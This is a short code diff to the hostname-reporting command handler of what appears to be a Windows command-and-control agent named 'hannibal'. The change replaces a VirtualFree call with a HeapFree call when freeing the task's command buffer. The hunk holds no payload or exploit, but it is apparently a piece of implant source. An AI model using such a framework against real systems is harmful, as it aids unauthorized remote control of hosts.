@@ -19,7 +19,7 @@ SECTION_CODE void cmd_hostname(TASK t)
 
     hannibal_response(hostname, t.task_uuid);
 
-    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
+    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
 }
 
 #endif
